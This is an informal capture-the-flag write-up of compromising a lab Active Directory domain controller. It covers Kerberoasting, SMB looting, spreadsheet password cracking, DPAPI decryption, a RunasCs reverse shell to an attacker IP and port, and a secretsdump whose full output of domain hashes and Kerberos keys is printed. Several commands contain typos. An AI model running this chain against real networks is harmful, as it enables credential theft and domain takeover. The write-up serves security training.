The room gives us creds  so its a assumed breach `ryan.naylor:HollowOct31Nyt`
Started with a nmap scan
```
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-31 07:59:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50968/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50969/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50971/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50997/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61767/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```
There is a Hostname of `DC` and a domain from the ldap server `voleur.htb` 
First since our clock skew is behind by 8 hours we need to set are date `sudo ntpdate voleur.htb` now we need to make a ticket to auth with since the creds dont work on anything `impacket-getTGT voleur.htb/'ryan.naylor':'Hollow0ct31Nyt'` and then `export KRB5CCNAME=ryan.naylor.ccache` now we can use this ticket to auth to the ldap and other services now we can try and auth to the ldap `nxc ldap 10.10.11.76 --use-kcache` and now we can auth time to get bloodhound data `nxc ldap 10.10.11.76 --use-kcache --bloodhound -c all --dns-server 10.10.11.76` and now we need to look at this data in the mean time ima gonna spider the smb to see if there is anything `nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt -M spider_plus` we have access to one share `IT` and it has a file `Access_review.xlsx` we can also get a list of users now `nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt --users` 
```
Administrator
Guest
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
```
and now to get the file off the SMB before we look at bloodhound `impacket-smbclient dc.voleur.htb -k` and then do `use IT` `cd First-Line Support` and then `get Access_review.xslx` time to give a quick view at the bloodhound so we have no outbound connections and we dont have WRITE prives on the SMB trying to look at the file its password protected so we can use `office2john` and turn it into a hash we can crack `office2john Access_review.xslx > xslx.hash` and it cracked to `football1` and once we opened it it has a bunch of logins for the users 
```
svc_ldap:M1XyC9pW7qT5Vn use -k
svc_iis:N5pXyW1VqM7CZ8
account deleted 
todd.wolfe:NightT1meP1dg3on14
```
There are two new accounts we can access but the `svc_ldap` account is the only one with outbound control first we can do `WriteSPN` to the `svc_winrm` account to give us winrm access but first we need to make a ticket for this account also `impacket-getTGT voleur.thb/'svc_ldap':'M1XyC9pW7qT5Vn'` and we export it the same way now we can do the targeted kerberos attack `python3 /opt/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb` and we get bacl 3 users `lacey.miller` `todd.wolfe` `svc_winrm` we could only crack one account `svc_winrm:AFireInsidede0zarctica980219afi` and now we need to get a ticket for this account also with the same steps and then export it we have to generate are kerb5 file `sudo nxc smb dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --generate-kerb5-file /etc/kerb5.conf` now we can winrm into the host machine `eveil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb` now we can get the user flag but there is also one more outbound object for the `svc_ldap` user and none for `svc_winrm` user ldap is member of `restore_users` and we can `GenericWrite` over the `Lacey.miller` user and the `Second-line Support` group but we need to upload `RunaS.exe` and now we need to get a reverse shell as the `svc_ldap` `.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.92:4444` and now we have a shell as the `svc_ldap` now we need to restore `todd` account `get-adobject -filter 'isDeleted -eq $true -and Name 0like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-adobject` and then we can check if it went good with `net user /domain` and we see the account now we need to make a ticket for the todd account and then and now looking at the shares of the SMB we have access to `Second-Line Support` and todd has a account and has some DIAPI files in it now we can use impacket agin and get the decrypt key `impacket-dpapi masterkey -file (file) -sid S-1-5-21-3927696377-1337352550-27817154` and now we have the key nwo to get the creds `impacket-dpapi credential -file (file) -key 0xd2` and now we got the creds for `jeremy.combs:qT3V9pLXyN7W4m` and we need to make a ticket now for this account now to get new bloodhound data now we have access to `Thrid-Line Support` which has a `id_rsa` and a `Note.txt.txt` now we can SSH as the `svc_backup` account `ssh svc_backup@voleur.htb -p 2222 -i id_rsa` looking around the file system we find the SMB `/mnt/c/IT/Thrid-Line Support/Backups/Active Directory` and there is a `ntds.dit` and a `ntds.jfm` and now go back one folder and there is a registry folder with the SYSTEM in it and now we can do a scretsdump `impacket-secretsdump -ntds ntds.dit -system SYSTEM local` 
```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```
and now we can winrm as the admin account now make a ticket and then we can auth with `evil-winrm` 